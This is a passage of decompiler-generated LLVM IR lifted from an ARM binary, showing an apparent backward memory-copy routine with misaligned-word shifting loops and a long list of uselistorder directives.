dec_label_pc_14040.loopexit:                      ; preds = %dec_label_pc_14028
  %v4_14038 = sub i32 3, %v0_14038
  %v5_14038 = and i32 %v4_14038, %v0_14038
  %v6_14038 = icmp slt i32 %v5_14038, 0
  %v7_14038 = icmp slt i32 %v2_14038, 0
  store i1 %v6_14038, i1* %cpsr_v.global-to-local, align 1
  store i1 %v7_14038, i1* %cpsr_n.global-to-local, align 1
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_14040

dec_label_pc_14040:                               ; preds = %dec_label_pc_14040.loopexit, %dec_label_pc_1401c
  %v2_13f8450 = phi i32 [ %v5_14034, %dec_label_pc_14040.loopexit ], [ %v1_14010, %dec_label_pc_1401c ]
  %v0_13f7446 = phi i32 [ %v2_14038, %dec_label_pc_14040.loopexit ], [ %v2_14020, %dec_label_pc_1401c ]
  %v0_14040 = load i32, i32* %r1.global-to-local, align 4
  %v1_14040 = add i32 %v0_14040, 3
  store i32 %v1_14040, i32* @r1, align 4
  br label %bb150

dec_label_pc_14048:                               ; preds = %dec_label_pc_13fd8
  br i1 %v5_140b8, label %dec_label_pc_14094, label %dec_label_pc_14050

dec_label_pc_14050:                               ; preds = %dec_label_pc_14048
  store i32 %v2_140b4, i32* %r2.global-to-local, align 4
  %v3_14054 = load i32, i32* @r4, align 4
  store i32 %v3_14054, i32* %stack_var_-12, align 4
  %v6_14054 = load i32, i32* @r5, align 4
  %v8_14054 = inttoptr i32 %v6_14054 to i8*
  store i8* %v8_14054, i8** %stack_var_-8, align 4
  %v11_14054 = load i32, i32* @lr, align 4
  br label %dec_label_pc_14058

dec_label_pc_14058:                               ; preds = %dec_label_pc_14058.dec_label_pc_14058_crit_edge, %dec_label_pc_14050
  %v0_1407c = phi i32 [ %v1_1407c, %dec_label_pc_14058.dec_label_pc_14058_crit_edge ], [ %v0_1401018, %dec_label_pc_14050 ]
  %v0_1405c = phi i32 [ %v0_1405c.pre, %dec_label_pc_14058.dec_label_pc_14058_crit_edge ], [ %v1_13fc8, %dec_label_pc_14050 ]
  %v0_14058 = phi i32 [ %v0_14058.pre, %dec_label_pc_14058.dec_label_pc_14058_crit_edge ], [ %v2_13fcc, %dec_label_pc_14050 ]
  %v3_14058 = mul i32 %v0_14058, 65536
  store i32 %v3_14058, i32* %lr.global-to-local, align 4
  %v1_1405c = add i32 %v0_1405c, -4
  %v2_1405c = inttoptr i32 %v1_1405c to i32*
  %v3_1405c = load i32, i32* %v2_1405c, align 4
  store i32 %v3_1405c, i32* @r3, align 4
  %v4_1405c = add i32 %v0_1405c, -8
  %v5_1405c = inttoptr i32 %v4_1405c to i32*
  %v6_1405c = load i32, i32* %v5_1405c, align 4
  store i32 %v6_1405c, i32* %r4.global-to-local, align 4
  %v7_1405c = add i32 %v0_1405c, -12
  %v8_1405c = inttoptr i32 %v7_1405c to i32*
  %v9_1405c = load i32, i32* %v8_1405c, align 4
  store i32 %v9_1405c, i32* %r5.global-to-local, align 4
  %v10_1405c = add i32 %v0_1405c, -16
  %v11_1405c = inttoptr i32 %v10_1405c to i32*
  %v12_1405c = load i32, i32* %v11_1405c, align 4
  store i32 %v10_1405c, i32* %r1.global-to-local, align 4
  %v4_14060 = udiv i32 %v12_1405c, 65536
  %v5_14060 = or i32 %v4_14060, %v3_14058
  store i32 %v5_14060, i32* %lr.global-to-local, align 4
  %v3_14064 = mul i32 %v12_1405c, 65536
  %v4_14068 = udiv i32 %v9_1405c, 65536
  %v5_14068 = or i32 %v3_14064, %v4_14068
  store i32 %v5_14068, i32* @ip, align 4
  %v3_1406c = mul i32 %v9_1405c, 65536
  %v4_14070 = udiv i32 %v6_1405c, 65536
  %v5_14070 = or i32 %v3_1406c, %v4_14070
  store i32 %v5_14070, i32* %r5.global-to-local, align 4
  %v3_14074 = mul i32 %v6_1405c, 65536
  %v4_14078 = udiv i32 %v3_1405c, 65536
  %v5_14078 = or i32 %v3_14074, %v4_14078
  store i32 %v5_14078, i32* %r4.global-to-local, align 4
  %v1_1407c = add i32 %v0_1407c, -16
  %v2_1407c = inttoptr i32 %v1_1407c to i32*
  store i32 %v5_14078, i32* %v2_1407c, align 4
  %v4_1407c = add i32 %v0_1407c, -12
  %v5_1407c = inttoptr i32 %v4_1407c to i32*
  %v6_1407c = load i32, i32* %r5.global-to-local, align 4
  store i32 %v6_1407c, i32* %v5_1407c, align 4
  %v7_1407c = add i32 %v0_1407c, -8
  %v8_1407c = inttoptr i32 %v7_1407c to i32*
  %v9_1407c = load i32, i32* @ip, align 4
  store i32 %v9_1407c, i32* %v8_1407c, align 4
  %v10_1407c = add i32 %v0_1407c, -4
  %v11_1407c = inttoptr i32 %v10_1407c to i32*
  %v12_1407c = load i32, i32* %lr.global-to-local, align 4
  store i32 %v12_1407c, i32* %v11_1407c, align 4
  store i32 %v1_1407c, i32* %r0.global-to-local, align 4
  %v0_14080 = load i32, i32* %r2.global-to-local, align 4
  %v2_14080 = add i32 %v0_14080, -16
  store i32 %v2_14080, i32* %r2.global-to-local, align 4
  %v6_14084 = icmp slt i32 %v0_14080, 16
  br i1 %v6_14084, label %dec_label_pc_14088, label %dec_label_pc_14058.dec_label_pc_14058_crit_edge

dec_label_pc_14058.dec_label_pc_14058_crit_edge:  ; preds = %dec_label_pc_14058
  %v0_14058.pre = load i32, i32* @r3, align 4
  %v0_1405c.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_14058

dec_label_pc_14088:                               ; preds = %dec_label_pc_14058
  %v2_14088 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_14088, i32* @r4, align 4
  %v5_14088 = load i8*, i8** %stack_var_-8, align 4
  %v6_14088 = ptrtoint i8* %v5_14088 to i32
  store i32 %v6_14088, i32* @r5, align 4
  store i32 %v11_14054, i32* @lr, align 4
  %v2_1408c = add i32 %v0_14080, -4
  store i32 %v2_1408c, i32* %r2.global-to-local, align 4
  %v4_1408c = add i32 %v0_14080, 2147483632
  %v5_1408c = and i32 %v2_1408c, %v4_1408c
  %v6_1408c = icmp slt i32 %v5_1408c, 0
  store i1 %v6_1408c, i1* %cpsr_v.global-to-local, align 1
  %v7_1408c = icmp slt i32 %v2_1408c, 0
  store i1 %v7_1408c, i1* %cpsr_n.global-to-local, align 1
  %v8_1408c = icmp eq i32 %v2_1408c, 0
  store i1 %v8_1408c, i1* %cpsr_z.global-to-local, align 1
  %v5_14090 = icmp slt i32 %v2_14080, -12
  br i1 %v5_14090, label %dec_label_pc_140ac, label %dec_label_pc_14094

dec_label_pc_14094:                               ; preds = %dec_label_pc_14088, %dec_label_pc_14048, %dec_label_pc_14094
  %v1_140a0 = phi i32 [ %v5_140a0, %dec_label_pc_14094 ], [ %v1_1407c, %dec_label_pc_14088 ], [ %v0_1401018, %dec_label_pc_14048 ]
  %v0_14094 = load i32, i32* @r3, align 4
  %v3_14094 = mul i32 %v0_14094, 65536
  store i32 %v3_14094, i32* %ip.global-to-local, align 4
  %v0_14098 = load i32, i32* %r1.global-to-local, align 4
  %v1_14098 = add i32 %v0_14098, -4
  %v2_14098 = inttoptr i32 %v1_14098 to i32*
  %v3_14098 = load i32, i32* %v2_14098, align 4
  store i32 %v3_14098, i32* @r3, align 4
  store i32 %v1_14098, i32* %r1.global-to-local, align 4
  %v4_1409c = udiv i32 %v3_14098, 65536
  %v5_1409c = or i32 %v4_1409c, %v3_14094
  store i32 %v5_1409c, i32* @ip, align 4
  %v2_140a0 = add i32 %v1_140a0, -4
  %v3_140a0 = inttoptr i32 %v2_140a0 to i32*
  store i32 %v5_1409c, i32* %v3_140a0, align 4
  %v4_140a0 = load i32, i32* %r0.global-to-local, align 4
  %v5_140a0 = add i32 %v4_140a0, -4
  store i32 %v5_140a0, i32* %r0.global-to-local, align 4
  %v0_140a4 = load i32, i32* %r2.global-to-local, align 4
  %v2_140a4 = add i32 %v0_140a4, -4
  store i32 %v2_140a4, i32* %r2.global-to-local, align 4
  %v6_140a8 = icmp slt i32 %v0_140a4, 4
  br i1 %v6_140a8, label %dec_label_pc_140ac.loopexit, label %dec_label_pc_14094

dec_label_pc_140ac.loopexit:                      ; preds = %dec_label_pc_14094
  %v4_140a4 = sub i32 3, %v0_140a4
  %v5_140a4 = and i32 %v4_140a4, %v0_140a4
  %v6_140a4 = icmp slt i32 %v5_140a4, 0
  %v7_140a4 = icmp slt i32 %v2_140a4, 0
  store i1 %v6_140a4, i1* %cpsr_v.global-to-local, align 1
  store i1 %v7_140a4, i1* %cpsr_n.global-to-local, align 1
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_140ac

dec_label_pc_140ac:                               ; preds = %dec_label_pc_140ac.loopexit, %dec_label_pc_14088
  %v2_13f8451 = phi i32 [ %v5_140a0, %dec_label_pc_140ac.loopexit ], [ %v1_1407c, %dec_label_pc_14088 ]
  %v0_13f7447 = phi i32 [ %v2_140a4, %dec_label_pc_140ac.loopexit ], [ %v2_1408c, %dec_label_pc_14088 ]
  %v0_140ac = load i32, i32* %r1.global-to-local, align 4
  %v1_140ac = add i32 %v0_140ac, 2
  store i32 %v1_140ac, i32* @r1, align 4
  br label %bb150

dec_label_pc_140b4:                               ; preds = %dec_label_pc_13fc8
  br i1 %v5_140b8, label %dec_label_pc_14100, label %dec_label_pc_140bc

dec_label_pc_140bc:                               ; preds = %dec_label_pc_140b4
  store i32 %v2_140b4, i32* %r2.global-to-local, align 4
  %v3_140c0 = load i32, i32* @r4, align 4
  store i32 %v3_140c0, i32* %stack_var_-12, align 4
  %v6_140c0 = load i32, i32* @r5, align 4
  %v8_140c0 = inttoptr i32 %v6_140c0 to i8*
  store i8* %v8_140c0, i8** %stack_var_-8, align 4
  %v11_140c0 = load i32, i32* @lr, align 4
  br label %dec_label_pc_140c4

dec_label_pc_140c4:                               ; preds = %dec_label_pc_140c4.dec_label_pc_140c4_crit_edge, %dec_label_pc_140bc
  %v0_140e8 = phi i32 [ %v1_140e8, %dec_label_pc_140c4.dec_label_pc_140c4_crit_edge ], [ %v0_1401018, %dec_label_pc_140bc ]
  %v0_140c8 = phi i32 [ %v0_140c8.pre, %dec_label_pc_140c4.dec_label_pc_140c4_crit_edge ], [ %v1_13fc8, %dec_label_pc_140bc ]
  %v0_140c4 = phi i32 [ %v0_140c4.pre, %dec_label_pc_140c4.dec_label_pc_140c4_crit_edge ], [ %v2_13fcc, %dec_label_pc_140bc ]
  %v3_140c4 = mul i32 %v0_140c4, 16777216
  store i32 %v3_140c4, i32* %lr.global-to-local, align 4
  %v1_140c8 = add i32 %v0_140c8, -4
  %v2_140c8 = inttoptr i32 %v1_140c8 to i32*
  %v3_140c8 = load i32, i32* %v2_140c8, align 4
  store i32 %v3_140c8, i32* @r3, align 4
  %v4_140c8 = add i32 %v0_140c8, -8
  %v5_140c8 = inttoptr i32 %v4_140c8 to i32*
  %v6_140c8 = load i32, i32* %v5_140c8, align 4
  store i32 %v6_140c8, i32* %r4.global-to-local, align 4
  %v7_140c8 = add i32 %v0_140c8, -12
  %v8_140c8 = inttoptr i32 %v7_140c8 to i32*
  %v9_140c8 = load i32, i32* %v8_140c8, align 4
  store i32 %v9_140c8, i32* %r5.global-to-local, align 4
  %v10_140c8 = add i32 %v0_140c8, -16
  %v11_140c8 = inttoptr i32 %v10_140c8 to i32*
  %v12_140c8 = load i32, i32* %v11_140c8, align 4
  store i32 %v10_140c8, i32* %r1.global-to-local, align 4
  %v4_140cc = udiv i32 %v12_140c8, 256
  %v5_140cc = or i32 %v4_140cc, %v3_140c4
  store i32 %v5_140cc, i32* %lr.global-to-local, align 4
  %v3_140d0 = mul i32 %v12_140c8, 16777216
  %v4_140d4 = udiv i32 %v9_140c8, 256
  %v5_140d4 = or i32 %v3_140d0, %v4_140d4
  store i32 %v5_140d4, i32* @ip, align 4
  %v3_140d8 = mul i32 %v9_140c8, 16777216
  %v4_140dc = udiv i32 %v6_140c8, 256
  %v5_140dc = or i32 %v3_140d8, %v4_140dc
  store i32 %v5_140dc, i32* %r5.global-to-local, align 4
  %v3_140e0 = mul i32 %v6_140c8, 16777216
  %v4_140e4 = udiv i32 %v3_140c8, 256
  %v5_140e4 = or i32 %v3_140e0, %v4_140e4
  store i32 %v5_140e4, i32* %r4.global-to-local, align 4
  %v1_140e8 = add i32 %v0_140e8, -16
  %v2_140e8 = inttoptr i32 %v1_140e8 to i32*
  store i32 %v5_140e4, i32* %v2_140e8, align 4
  %v4_140e8 = add i32 %v0_140e8, -12
  %v5_140e8 = inttoptr i32 %v4_140e8 to i32*
  %v6_140e8 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v6_140e8, i32* %v5_140e8, align 4
  %v7_140e8 = add i32 %v0_140e8, -8
  %v8_140e8 = inttoptr i32 %v7_140e8 to i32*
  %v9_140e8 = load i32, i32* @ip, align 4
  store i32 %v9_140e8, i32* %v8_140e8, align 4
  %v10_140e8 = add i32 %v0_140e8, -4
  %v11_140e8 = inttoptr i32 %v10_140e8 to i32*
  %v12_140e8 = load i32, i32* %lr.global-to-local, align 4
  store i32 %v12_140e8, i32* %v11_140e8, align 4
  store i32 %v1_140e8, i32* %r0.global-to-local, align 4
  %v0_140ec = load i32, i32* %r2.global-to-local, align 4
  %v2_140ec = add i32 %v0_140ec, -16
  store i32 %v2_140ec, i32* %r2.global-to-local, align 4
  %v6_140f0 = icmp slt i32 %v0_140ec, 16
  br i1 %v6_140f0, label %dec_label_pc_140f4, label %dec_label_pc_140c4.dec_label_pc_140c4_crit_edge

dec_label_pc_140c4.dec_label_pc_140c4_crit_edge:  ; preds = %dec_label_pc_140c4
  %v0_140c4.pre = load i32, i32* @r3, align 4
  %v0_140c8.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_140c4

dec_label_pc_140f4:                               ; preds = %dec_label_pc_140c4
  %v2_140f4 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_140f4, i32* @r4, align 4
  %v5_140f4 = load i8*, i8** %stack_var_-8, align 4
  %v6_140f4 = ptrtoint i8* %v5_140f4 to i32
  store i32 %v6_140f4, i32* @r5, align 4
  store i32 %v11_140c0, i32* @lr, align 4
  %v2_140f8 = add i32 %v0_140ec, -4
  store i32 %v2_140f8, i32* %r2.global-to-local, align 4
  %v4_140f8 = add i32 %v0_140ec, 2147483632
  %v5_140f8 = and i32 %v2_140f8, %v4_140f8
  %v6_140f8 = icmp slt i32 %v5_140f8, 0
  store i1 %v6_140f8, i1* %cpsr_v.global-to-local, align 1
  %v7_140f8 = icmp slt i32 %v2_140f8, 0
  store i1 %v7_140f8, i1* %cpsr_n.global-to-local, align 1
  %v8_140f8 = icmp eq i32 %v2_140f8, 0
  store i1 %v8_140f8, i1* %cpsr_z.global-to-local, align 1
  %v5_140fc = icmp slt i32 %v2_140ec, -12
  br i1 %v5_140fc, label %dec_label_pc_14118, label %dec_label_pc_14100

dec_label_pc_14100:                               ; preds = %dec_label_pc_140f4, %dec_label_pc_140b4, %dec_label_pc_14100
  %v1_1410c = phi i32 [ %v5_1410c, %dec_label_pc_14100 ], [ %v1_140e8, %dec_label_pc_140f4 ], [ %v0_1401018, %dec_label_pc_140b4 ]
  %v0_14100 = load i32, i32* @r3, align 4
  %v3_14100 = mul i32 %v0_14100, 16777216
  store i32 %v3_14100, i32* %ip.global-to-local, align 4
  %v0_14104 = load i32, i32* %r1.global-to-local, align 4
  %v1_14104 = add i32 %v0_14104, -4
  %v2_14104 = inttoptr i32 %v1_14104 to i32*
  %v3_14104 = load i32, i32* %v2_14104, align 4
  store i32 %v3_14104, i32* @r3, align 4
  store i32 %v1_14104, i32* %r1.global-to-local, align 4
  %v4_14108 = udiv i32 %v3_14104, 256
  %v5_14108 = or i32 %v4_14108, %v3_14100
  store i32 %v5_14108, i32* @ip, align 4
  %v2_1410c = add i32 %v1_1410c, -4
  %v3_1410c = inttoptr i32 %v2_1410c to i32*
  store i32 %v5_14108, i32* %v3_1410c, align 4
  %v4_1410c = load i32, i32* %r0.global-to-local, align 4
  %v5_1410c = add i32 %v4_1410c, -4
  store i32 %v5_1410c, i32* %r0.global-to-local, align 4
  %v0_14110 = load i32, i32* %r2.global-to-local, align 4
  %v2_14110 = add i32 %v0_14110, -4
  store i32 %v2_14110, i32* %r2.global-to-local, align 4
  %v6_14114 = icmp slt i32 %v0_14110, 4
  br i1 %v6_14114, label %dec_label_pc_14118.loopexit, label %dec_label_pc_14100

dec_label_pc_14118.loopexit:                      ; preds = %dec_label_pc_14100
  %v4_14110 = sub i32 3, %v0_14110
  %v5_14110 = and i32 %v4_14110, %v0_14110
  %v6_14110 = icmp slt i32 %v5_14110, 0
  %v7_14110 = icmp slt i32 %v2_14110, 0
  store i1 %v6_14110, i1* %cpsr_v.global-to-local, align 1
  store i1 %v7_14110, i1* %cpsr_n.global-to-local, align 1
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_14118

dec_label_pc_14118:                               ; preds = %dec_label_pc_14118.loopexit, %dec_label_pc_140f4
  %v2_13f8452 = phi i32 [ %v5_1410c, %dec_label_pc_14118.loopexit ], [ %v1_140e8, %dec_label_pc_140f4 ]
  %v0_13f7448 = phi i32 [ %v2_14110, %dec_label_pc_14118.loopexit ], [ %v2_140f8, %dec_label_pc_140f4 ]
  %v0_14118 = load i32, i32* %r1.global-to-local, align 4
  %v1_14118 = add i32 %v0_14118, 1
  store i32 %v1_14118, i32* @r1, align 4
  br label %bb150

; uselistorder directives
  uselistorder i32 %v5_1410c, { 0, 2, 1 }
  uselistorder i32 %v3_14100, { 1, 0 }
  uselistorder i32 %v2_140f8, { 0, 2, 3, 1, 4 }
  uselistorder i32 %v1_140e8, { 1, 0, 4, 3, 2 }
  uselistorder i32 %v10_140c8, { 1, 0 }
  uselistorder i32 %v3_140c4, { 1, 0 }
  uselistorder i32 %v0_140c8, { 3, 2, 1, 0 }
  uselistorder i32 %v0_140e8, { 3, 2, 1, 0 }
  uselistorder i32 %v5_140a0, { 0, 2, 1 }
  uselistorder i32 %v3_14094, { 1, 0 }
  uselistorder i32 %v2_1408c, { 0, 2, 3, 1, 4 }
  uselistorder i32 %v1_1407c, { 1, 0, 4, 3, 2 }
  uselistorder i32 %v10_1405c, { 1, 0 }
  uselistorder i32 %v3_14058, { 1, 0 }
  uselistorder i32 %v0_1405c, { 3, 2, 1, 0 }
  uselistorder i32 %v0_1407c, { 3, 2, 1, 0 }
  uselistorder i32 %v5_14034, { 0, 2, 1 }
  uselistorder i32 %v3_14028, { 1, 0 }
  uselistorder i32 %v2_14020, { 0, 2, 3, 1, 4 }
  uselistorder i32 %v1_14010, { 1, 0, 4, 3, 2 }
  uselistorder i32 %v10_13ff0, { 1, 0 }
  uselistorder i32 %v3_13fec, { 1, 0 }
  uselistorder i32 %v0_13ff0, { 3, 2, 1, 0 }
  uselistorder i32 %v0_14010, { 3, 2, 1, 0 }
  uselistorder i1 %v5_140b8, { 2, 0, 1 }
  uselistorder i32 %v0_13fd0, { 1, 0 }
  uselistorder i32 %v0_140bc, { 4, 1, 0, 3, 2 }
  uselistorder i32 %v0_1401018, { 0, 3, 1, 4, 2, 5 }
  uselistorder i32 %v1_13fc0, { 2, 1, 0 }
  uselistorder i32 %v0_13fc0, { 2, 0, 1 }
  uselistorder i32 %v2_13fb8, { 3, 4, 0, 5, 2, 1 }
  uselistorder i32 %v1_13fb8, { 1, 2, 0, 3 }
  uselistorder i32 %v0_13fb8, { 2, 3, 0, 1, 4 }
  uselistorder i32 %v0_1401019, { 2, 1, 0 }
  uselistorder i32 %v11_13f94, { 1, 0 }
  uselistorder i32 %v7_13f94, { 1, 0 }
  uselistorder i32 %v1_13f74, { 0, 1, 3, 4, 2, 5 }
  uselistorder i32 %v0_13f74, { 1, 2, 0, 3 }
  uselistorder i32 %v2_13f78, { 1, 0 }
  uselistorder i32 %v7_13f6c, { 0, 2, 1 }
  uselistorder i32 %v10_13f68, { 1, 0 }
  uselistorder i32 %v9_13f60, { 1, 0, 2 }
  uselistorder i32 %v6_13f5c, { 1, 0 }
  uselistorder i32 %v2_13f54, { 0, 2, 1, 3, 5, 6, 4, 7 }
  uselistorder i32 %v0_13f54, { 1, 2, 4, 0, 3 }
  uselistorder i32 %v7_13f64, { 0, 3, 2, 1 }
  uselistorder i32 %v7_13f48, { 0, 2, 1 }
  uselistorder i32 %v13_13f44, { 1, 0 }
  uselistorder i32 %v4_13f40, { 0, 2, 3, 1, 4 }
  uselistorder i32 %v0_13f40, { 2, 0, 1 }
  uselistorder i32 %v6_13f48, { 0, 3, 2, 1 }
  uselistorder i32 %v7_13f38, { 0, 2, 1 }
  uselistorder i32 %v16_13f34, { 1, 0 }
  uselistorder i32 %v4_13f30, { 1, 2, 0 }
  uselistorder i32 %v0_13f40.pr, { 1, 3, 0, 2 }
  uselistorder i32 %v6_13f38, { 0, 4, 3, 2, 1 }
  uselistorder i32 %v1_13f24, { 0, 3, 2, 1 }
  uselistorder i32 %v10_13f20, { 1, 0 }
  uselistorder i32 %v1_13f1c, { 1, 0 }
  uselistorder i32 %v10_13f18, { 1, 0 }
  uselistorder i32 %v0_13f18, { 3, 2, 1, 0 }
  uselistorder i32 %v0_13f1c, { 0, 1, 2, 3, 7, 6, 5, 4 }
  uselistorder i32 %v2_13f10, { 0, 2, 1 }
  uselistorder i32 %v2_13f04, { 0, 2, 1, 3, 5, 4 }
  uselistorder i32 %v0_13f04, { 1, 2, 6, 3, 0, 5, 4 }
  uselistorder i32 %v0_13f1c36, { 1, 2, 0 }
  uselistorder i32 %v1_13efc, { 2, 1, 0 }
  uselistorder i32 %v1_13ef4, { 2, 3, 1, 0 }
  uselistorder i32 %v2_13eec, { 2, 0, 1, 4, 3 }
  uselistorder i32 %v2_13ee8, { 3, 4, 1, 2, 0, 5 }
  uselistorder i32 %v2_13ee4, { 2, 3, 1, 0, 4 }
  uselistorder i32 %v1_13ee4, { 3, 4, 0, 6, 5, 1, 2 }
  uselistorder i32 %v1_13ed4, { 0, 2, 1 }
  uselistorder i32 %v4_13ed0, { 1, 0 }
  uselistorder i32 %v3_13ec4, { 1, 0 }
  uselistorder i32 %v1_13ebc, { 0, 2, 3, 1, 4 }
  uselistorder i32 %v1_13eb0, { 1, 0 }
  uselistorder i32 %v12_13eac, { 0, 2, 1 }
  uselistorder i32 %v8_13e8c, { 1, 0, 2 }
  uselistorder i32 %v5_13e8c, { 1, 0, 2 }
  uselistorder i32 %v2_13e8c, { 1, 0, 2 }
  uselistorder i32 %v0_13e8c, { 4, 3, 2, 1, 0 }
  uselistorder i32 %v0_13eac, { 4, 3, 2, 1, 0 }
  uselistorder i32 %v1_13e68, { 0, 2, 1 }
  uselistorder i32 %v4_13e64, { 1, 0 }
  uselistorder i32 %v3_13e58, { 1, 0 }
  uselistorder i32 %v1_13e50, { 0, 2, 3, 1, 4 }
  uselistorder i32 %v1_13e44, { 1, 0 }
  uselistorder i32 %v12_13e40, { 0, 2, 1 }
  uselistorder i32 %v8_13e20, { 1, 0, 2 }
  uselistorder i32 %v5_13e20, { 1, 0, 2 }
  uselistorder i32 %v2_13e20, { 1, 0, 2 }
  uselistorder i32 %v0_13e20, { 4, 3, 2, 1, 0 }
  uselistorder i32 %v0_13e40, { 4, 3, 2, 1, 0 }
  uselistorder i32 %v1_13dfc, { 0, 2, 1 }
  uselistorder i32 %v4_13df8, { 1, 0 }
  uselistorder i32 %v3_13dec, { 1, 0 }
  uselistorder i32 %v1_13de4, { 0, 2, 3, 1, 4 }
  uselistorder i32 %v1_13dd8, { 1, 0 }
  uselistorder i32 %v12_13dd4, { 0, 2, 1 }
  uselistorder i32 %v8_13db4, { 1, 0, 2 }
  uselistorder i32 %v5_13db4, { 1, 0, 2 }
  uselistorder i32 %v2_13db4, { 1, 0, 2 }
  uselistorder i32 %v0_13db4, { 4, 3, 2, 1, 0 }
  uselistorder i32 %v0_13dd4, { 4, 3, 2, 1, 0 }
  uselistorder i1 %v2_13e10, { 0, 2, 1 }
  uselistorder i32 %v1_13e0c, { 2, 0, 1, 3 }
  uselistorder i32 %v4_13d90, { 2, 0, 1, 3 }
  uselistorder i32 %v2_13d90, { 2, 0, 1, 3 }
  uselistorder i32 %v0_13e14, { 1, 0, 3, 2 }
  uselistorder i32 %v0_13eac75, { 0, 5, 1, 3, 2, 4 }
  uselistorder i32 %v1_13d84, { 1, 0 }
  uselistorder i32 %v0_13d84, { 3, 1, 0, 2 }
  uselistorder i32 %v2_13d7c, { 2, 4, 0, 5, 1, 3 }
  uselistorder i32 %v1_13d7c, { 1, 0, 2 }
  uselistorder i32 %v0_13d7c, { 2, 0, 1, 3 }
  uselistorder i32 %v0_13eac76, { 1, 0 }
  uselistorder i32 %v1_13d5c, { 1, 0, 3, 2, 4 }
  uselistorder i32 %v0_13d64, { 1, 0 }
  uselistorder i32 %v0_13d38, { 3, 0, 1, 2 }
  uselistorder i32 %v1_13d2c, { 1, 2, 0, 3 }
  uselistorder i32 %v5_13d18, { 1, 0, 2 }
  uselistorder i32 %v1_13d14, { 1, 0 }
  uselistorder i32 %v1_13d0c, { 2, 0, 1, 4, 5, 3, 6 }
  uselistorder i32 %v0_13d0c, { 1, 2, 0, 3 }
  uselistorder i32 %v4_13d04, { 0, 2, 1 }
  uselistorder i32 %v3_13d04, { 3, 0, 1, 2 }
  uselistorder i1 %v0_13d04, { 1, 0 }
  uselistorder i1 %v1_13d04, { 1, 0 }
  uselistorder i32 %v3_13d00, { 0, 4, 3, 2, 1 }
  uselistorder i32 %v1_13cf8, { 0, 2, 3, 1, 4 }
  uselistorder i32 %v1_13ce4, { 1, 2, 0 }
  uselistorder i32 %v1_13cdc, { 0, 2, 1 }
  uselistorder i32 %v12_13cd8, { 0, 1, 3, 2 }
  uselistorder i32 %v0_13ccc, { 4, 3, 2, 1, 0 }
  uselistorder i32 %v0_13cd0, { 0, 1, 2, 3, 4, 5, 6, 7, 12, 11, 10, 9, 8 }
  uselistorder i32 %v1_13cc0, { 0, 2, 1 }
  uselistorder i32 %v1_13cb8, { 0, 1, 2, 4, 3 }
  uselistorder i32 %v0_13cb8, { 1, 2, 3, 0, 5, 4 }
  uselistorder i32 %v1_13cb0, { 1, 0 }
  uselistorder i32 %v1_13ca8, { 2, 1, 0 }
  uselistorder i32 %v2_13ca0, { 1, 2, 0, 4, 3 }
  uselistorder i32 %v0_13ca0, { 1, 4, 0, 2, 3 }
  uselistorder i32 %v8_13c9c, { 1, 0 }
  uselistorder i32 %v2_13c90, { 1, 0 }
  uselistorder i32 %v1_13c90, { 1, 4, 5, 3, 0, 6, 8, 2, 7, 9 }
  uselistorder i32 %v0_13c90, { 1, 7, 8, 6, 4, 0, 5, 10, 2, 3, 9, 11 }
  uselistorder i8** %stack_var_-8, { 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32* %r2.global-to-local, { 0, 30, 1, 2, 3, 4, 5, 31, 6, 7, 8, 9, 10, 32, 11, 12, 13, 14, 15, 33, 16, 18, 17, 19, 20, 21, 22, 23, 24, 26, 25, 27, 28, 29, 34, 35, 67, 36, 37, 38, 39, 40, 68, 41, 42, 43, 44, 45, 69, 46, 47, 48, 49, 50, 70, 51, 52, 53, 55, 54, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 71 }
  uselistorder i32* %r1.global-to-local, { 2, 0, 12, 1, 3, 6, 4, 13, 5, 7, 10, 8, 14, 9, 11, 15, 16, 17, 20, 18, 30, 19, 21, 24, 22, 31, 23, 25, 28, 26, 32, 27, 29, 33, 34, 37, 35, 38, 36, 39, 40, 41, 42 }
  uselistorder i32* %r0.global-to-local, { 2, 24, 3, 4, 25, 5, 6, 26, 7, 8, 9, 10, 11, 12, 27, 13, 15, 14, 16, 17, 28, 18, 19, 29, 20, 21, 22, 23, 30, 31, 39, 32, 33, 40, 34, 35, 41, 36, 37, 42, 38, 43, 44, 46, 45, 47, 48, 50, 49, 51, 52, 58, 59, 53, 54, 55, 60, 56, 57, 61, 62, 0, 1 }
  uselistorder i32* %lr.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 26, 18, 19, 20, 27, 21, 22, 23, 28, 24, 25, 29, 30, 31, 32, 33, 34, 35, 36, 37 }
  uselistorder i1* %cpsr_z.global-to-local, { 4, 7, 5, 9, 6, 10, 8, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 3, 21, 22, 23, 24, 25, 2, 26, 0, 27, 1, 29, 28, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47 }
  uselistorder i1* %cpsr_v.global-to-local, { 4, 7, 5, 9, 6, 10, 8, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 3, 21, 22, 23, 2, 24, 0, 25, 1, 27, 26, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44 }
  uselistorder i1* %cpsr_n.global-to-local, { 4, 7, 5, 9, 6, 10, 8, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 3, 22, 23, 24, 25, 26, 2, 27, 0, 28, 1, 30, 29, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50 }
  uselistorder i32 2147483632, { 3, 4, 5, 2, 0, 1 }
  uselistorder i32 -5, { 1, 0, 2, 3 }
  uselistorder i32 -28, { 1, 2, 0 }
  uselistorder label %dec_label_pc_14100, { 2, 0, 1 }
  uselistorder label %dec_label_pc_14094, { 2, 0, 1 }
  uselistorder label %dec_label_pc_14028, { 2, 0, 1 }
  uselistorder label %dec_label_pc_13fc8, { 1, 0 }
  uselistorder label %.thread13, { 2, 0, 1 }
